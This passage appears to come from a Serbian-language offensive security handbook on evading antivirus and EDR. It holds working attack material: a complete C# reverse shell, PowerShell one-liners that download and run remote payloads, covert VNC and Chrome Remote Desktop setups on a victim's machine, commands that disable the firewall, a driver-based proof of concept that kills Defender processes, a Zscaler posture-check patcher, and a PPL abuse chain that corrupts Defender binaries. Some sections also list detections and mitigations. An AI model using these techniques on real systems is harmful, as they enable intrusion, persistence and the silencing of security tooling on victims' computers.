- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscate različite PE fajlove, uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za jezike koje podržava LLVM, koji koristi ROP (return-oriented programming). ROPfuscator obfuscate program na nivou assembly koda tako što regularne instrukcije transformiše u ROP chains, čime onemogućava našu prirodnu predstavu normalnog control flow-a.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u jeziku Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeći EXE/DLL u shellcode i zatim da ga učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na osnovu reputacije, što znači da će aplikacije koje se retko preuzimaju aktivirati SmartScreen, čime će krajnji korisnik biti upozoren i sprečen da izvrši fajl (iako se fajl i dalje može izvršiti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa nazivom Zone.Identifier, koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kog je fajl preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani **trusted** signing certificate-om **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web jeste da ih zapakujete unutar neke vrste kontejnera, kao što je ISO. To se dešava zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na volumene koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloads u izlazne kontejnere kako bi zaobišao Mark-of-the-Web.

Primer upotrebe:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a unutar ISO datoteka pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logging u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **beleže događaje**. Međutim, security proizvodi ga takođe mogu koristiti za nadgledanje i otkrivanje malicioznih aktivnosti.

Slično načinu na koji se AMSI onemogućava (bypass-uje), moguće je učiniti da funkcija **`EtwEventWrite`** user space procesa odmah vrati rezultat bez beleženja događaja. To se postiže patch-ovanjem funkcije u memoriji tako da odmah vrati rezultat, čime se efektivno onemogućava ETW logging za taj proces.

Više informacija možete pronaći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i još uvek predstavlja veoma dobar način za pokretanje vaših post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će payload biti učitan direktno u memoriju bez upisivanja na disk, potrebno je da vodimo računa samo o patch-ovanju AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava direktno izvršavanje C# assembly-ja iz memorije, ali postoje različiti načini za to:

- **Fork\&Run**

Ovaj pristup podrazumeva **pokretanje novog sacrificial procesa**, inject-ovanje vašeg malicioznog post-exploitation koda u taj novi proces, izvršavanje malicioznog koda i, po završetku, gašenje novog procesa. Ovo ima i prednosti i nedostatke. Prednost fork and run metode je u tome što se izvršavanje odvija **izvan** našeg Beacon implant procesa. To znači da, ako nešto pođe po zlu tokom naše post-exploitation aktivnosti ili ona bude detektovana, postoji **mnogo veća šansa** da naš **implant preživi.** Nedostatak je **veća verovatnoća** da ćete biti uhvaćeni pomoću **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o inject-ovanju malicioznog post-exploitation koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali je nedostatak to što, ako nešto pođe po zlu tokom izvršavanja vašeg payload-a, postoji **mnogo veća šansa** da **izgubite beacon**, jer može doći do crash-a.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly-je možete učitati i **iz PowerShell-a**; pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video autora S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati maliciozni kod korišćenjem drugih jezika tako što se kompromitovanoj mašini omogući pristup **interpreter okruženju instaliranom na Attacker Controlled SMB share-u**.

Omogućavanjem pristupa Interpreter Binary datotekama i okruženju na SMB share-u možete **izvršavati proizvoljan kod u ovim jezicima unutar memorije** kompromitovane mašine.

Repozitorijum navodi: Defender i dalje skenira skripte, ali korišćenjem Go-a, Java-e, PHP-a itd. dobijamo **veću fleksibilnost za zaobilaženje statičkih signatura**. Testiranje nasumičnih, ne-obfuskovanih reverse shell skripti u ovim jezicima pokazalo se uspešnim.

## TokenStomping

Token stomping je tehnika koja napadaču omogućava da **manipuliše access token-om ili security proizvodom kao što su EDR ili AV**, čime može da smanji njegove privilegije tako da proces ne bude ugašen, ali da nema dozvole za proveru malicioznih aktivnosti.

Da bi se ovo sprečilo, Windows može **sprečiti eksterne procese** da dobiju handle-ove nad tokenima security procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je jednostavno deploy-ovati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole i održavanje persistence-a:
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Tiho pokrenite installer na računaru žrtve (potrebne su administratorske privilegije): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop-a i kliknite na next. Wizard će zatim zatražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite dati parameter uz određene izmene: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Obratite pažnju na pin parametar, koji omogućava postavljanje pina bez korišćenja GUI-ja).


## Advanced Evasion

Evasion je veoma složena tema; ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kog radite ima sopstvene prednosti i slabosti.

Toplo vam preporučujem da pogledate ovo predavanje autora [@ATTL4S](https://twitter.com/DaniLJ94), kako biste stekli osnovu za naprednije Evasion tehnike.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe odlično predavanje autora [@mariuszbit](https://twitter.com/mariuszbit) o temi Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Provera koje delove Defender pronalazi kao maliciozne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** sve dok **ne utvrdi koji deo Defender** prepoznaje kao maliciozan, a zatim će ga izdvojiti.\
Drugi alat koji radi **istu stvar je** [**avred**](https://github.com/dobin/avred), uz javno dostupan web servis na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Sve do Windows10, svi Windows sistemi su dolazili sa **Telnet serverom** koji ste mogli da instalirate (kao administrator) pomoću:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Podesite da se **pokrene** pri pokretanju sistema i pokrenite ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port (stealth) i onemogući firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, a ne setup)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarni fajl _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ na **žrtvu**

#### **Obrnuta veza**

**Napadač** treba da **pokrene unutar** svog **hosta** binarni fajl `vncviewer.exe -listen 5900`, kako bi bio **spreman** da prihvati obrnutu **VNC vezu**. Zatim, na **žrtvi**: Pokrenite winvnc daemon pomoću `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste očuvali prikrivanje, ne smete raditi nekoliko stvari

- Nemojte pokretati `winvnc` ako je već pokrenut, jer ćete aktivirati [iskačući prozor](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez fajla `UltraVNC.ini` u istom direktorijumu, jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć, jer ćete aktivirati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT-a:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite listener** pomoću `msfconsole -r file.rc` i **izvršite** **XML payload** pomoću:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će veoma brzo prekinuti proces.**

### Compiling our own reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenjem kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje pythona za primer izrade injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Drugi alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Onemogućavanje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** za onemogućavanje endpoint zaštite pre isporuke ransomware-a. Alat donosi **sopstveni ranjivi, ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu da blokiraju.

Ključne stavke
1. **Potpisani driver**: Datoteka isporučena na disk je `ServiceMouse.sys`, ali je binarni fajl zapravo legitimno potpisani driver `AToolsKrnl64.sys` kompanije Antiy Labs, iz njenog alata “System In-Depth Analysis Toolkit”. Pošto driver poseduje važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel servis**, a druga ga pokreće, čime `\\.\ServiceMouse` postaje dostupan iz user land-a.
3. **IOCTL-ovi koje driver izlaže**
| IOCTL kod | Mogućnost                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Prekid proizvoljnog procesa prema PID-u (koristi se za gašenje Defender/EDR servisa) |
| `0x990000D0` | Brisanje proizvoljne datoteke sa diska |
| `0x990001D0` | Unload driver-a i uklanjanje servisa |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi user-mode zaštite; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, prekine ih ili menja kernel objekte, bez obzira na PPL/PP, ELAM ili druge funkcije hardening-a.

Detekcija / Mitigacija
•  Omogućite Microsoft-ovu listu blokiranih ranjivih driver-a (`HVCI`, `Smart App Control`) kako Windows ne bi učitao `AToolsKrnl64.sys`.
•  Nadgledajte kreiranje novih *kernel* servisa i generišite upozorenje kada se driver učita iz world-writable direktorijuma ili kada se ne nalazi na allow-listi.
•  Pratite user-mode handle-ove ka prilagođenim device objektima, nakon čega slede sumnjivi `DeviceIoControl` pozivi.

### Zaobilaženje Zscaler Client Connector Posture provera patch-ovanjem binarnih fajlova na disku

Zscaler-ov **Client Connector** lokalno primenjuje pravila za proveru stanja uređaja i oslanja se na Windows RPC za komunikaciju rezultata sa drugim komponentama. Dva slaba izbora u dizajnu omogućavaju potpuno zaobilaženje:

1. Procena stanja se odvija **u potpunosti na klijentskoj strani** (serveru se šalje boolean vrednost).
2. Interni RPC endpoint-i proveravaju samo da li je izvršni fajl koji se povezuje **potpisao Zscaler** (putem `WinVerifyTrust`).

**Patch-ovanjem četiri potpisana binarna fajla na disku** oba mehanizma mogu biti neutralisana:

| Binarni fajl | Originalna logika koja je patch-ovana | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa je svaka provera usklađena |
| `ZSAService.exe` | Indirektni poziv ka `WinVerifyTrust` | Zamenjen NOP-ovima ⇒ svaki proces, čak i nepotpisan, može da se poveže na RPC cevi |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Preskočene |

Minimalni isečak patcher-a:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih datoteka i ponovnog pokretanja servisnog steka:

* **Sve** posture provere prikazuju **green/compliant**.
* Binarne datoteke bez potpisa ili sa izmenama mogu da otvore named-pipe RPC endpoints (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler policies.

Ova studija slučaja pokazuje kako čisto client-side odluke o poverenju i jednostavne provere potpisa mogu biti zaobiđene sa nekoliko byte patches.

## Zloupotreba Protected Process Light (PPL) za izmenu AV/EDR pomoću LOLBINs

Protected Process Light (PPL) nameće hijerarhiju signer/level tako da samo protected processes jednakog ili višeg nivoa mogu da menjaju jedni druge. Ofanzivno, ako možete legitimno da pokrenete PPL-enabled binary i kontrolišete njegove arguments, možete benignu funkcionalnost (npr. logging) pretvoriti u ograničeni, PPL-backed write primitive nad protected directories koje koristi AV/EDR.

Šta omogućava da proces radi kao PPL
- Ciljni EXE (i svi učitani DLLs) mora biti potpisan pomoću PPL-capable EKU.
- Proces mora biti kreiran pomoću CreateProcess sa flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora biti zatražen kompatibilan protection level koji odgovara signer-u binarne datoteke (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware signers, `PROTECTION_LEVEL_WINDOWS` za Windows signers). Pogrešni levels će dovesti do neuspeha pri kreiranju.

Pogledajte i širi uvod u PP/PPL i LSASS protection ovde:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Open-source helper: CreateProcessAsPPL (bira protection level i prosleđuje arguments ciljnom EXE-u):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Obrazac upotrebe:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binar `C:\Windows\System32\ClipUp.exe` sam se pokreće i prihvata parametar za upis log datoteke na putanju koju navede pozivalac.
- Kada se pokrene kao PPL proces, upis datoteke se izvršava uz PPL podršku.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite 8.3 kratke putanje za upućivanje na uobičajeno zaštićene lokacije.

Pomoćni alati za 8.3 kratke putanje
- Izlistajte kratka imena: `dir /x` u svakom nadređenom direktorijumu.
- Izvedite kratku putanju u cmd-u: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju loga da biste prinudili kreiranje datoteke u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite 8.3 kratka imena.
3) Ako je ciljna binarna datoteka obično otvorena/zaključana od strane AV-a dok radi (npr. MsMpEng.exe), zakažite upis pri pokretanju sistema, pre nego što se AV pokrene, instaliranjem auto-start servisa koji se pouzdano izvršava ranije. Proverite redosled pokretanja pomoću Process Monitor-a (boot logging).
4) Nakon ponovnog pokretanja, PPL-backed upis se izvršava pre nego što AV zaključa svoje binarne datoteke, čime se ciljna datoteka oštećuje i sprečava pokretanje.

Primer poziva (putanje su radi bezbednosti uklonjene/skraćene):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje, već samo njegovo odredište; primitive je pogodnije za korupciju nego za precizno ubacivanje sadržaja.
- Zahteva lokalne administratorske/SYSTEM privilegije za instaliranje/pokretanje servisa i period za reboot.
- Tajming je kritičan: cilj ne sme biti otvoren; izvršavanje tokom boot-a izbegava file lock-ove.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito kada ga pokreću nestandardni launcher-i, u periodu oko boot-a.
- Novi servisi konfigurisani za automatsko pokretanje sumnjivih binarnih fajlova i njihovo dosledno pokretanje pre Defender/AV-a. Istražite kreiranje/izmenu servisa pre pojave grešaka pri pokretanju Defender-a.
- File integrity monitoring Defender binarnih fajlova/Platform direktorijuma; neočekivano kreiranje/izmena fajlova od strane procesa sa protected-process flagovima.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane binarnih fajlova koji nisu AV.

Mitigacije
- WDAC/Code Integrity: ograničite koji potpisani binarni fajlovi mogu da se pokreću kao PPL i pod kojim parent procesima; blokirajte pozivanje ClipUp-a izvan legitimnih konteksta.
- Service hygiene: ograničite kreiranje/izmenu auto-start servisa i nadzirite manipulisanje redosledom pokretanja.
- Uverite se da su Defender tamper protection i early-launch zaštite omogućene; istražite greške pri pokretanju koje ukazuju na korupciju binarnih fajlova.
- Razmotrite onemogućavanje generisanja 8.3 short-name vrednosti na volume-ima koji sadrže security tooling, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

Reference za PPL i tooling
- Microsoft Protected Processes pregled: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU referenca: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (validacija redosleda): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender bira platformu iz koje se pokreće enumerisanjem poddirektorijuma unutar:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira poddirektorijum sa najvišim leksikografskim version string-om (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese Defender servisa (uz ažuriranje putanja servisa/registry-ja). Ovaj izbor veruje directory entry-jima, uključujući directory reparse points (symlink-ove). Administrator može da iskoristi ovo za preusmeravanje Defender-a na putanju u koju napadač može da upisuje i postigne DLL sideloading ili prekid rada servisa.

Preduslovi
- Lokalni Administrator (potreban za kreiranje direktorijuma/symlink-ova unutar Platform direktorijuma)
- Mogućnost reboot-a ili pokretanja ponovnog izbora Defender platforme (restart servisa pri boot-u)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene foldere, ali njegov izbor platforme veruje directory entry-jima i bira leksikografski najvišu verziju bez provere da li se cilj razrešava u zaštićenu/poverljivu putanju.

Korak po korak (primer)
1) Pripremite writable clone trenutnog platform foldera, na primer `C:\TMP\AV`:
```cmd
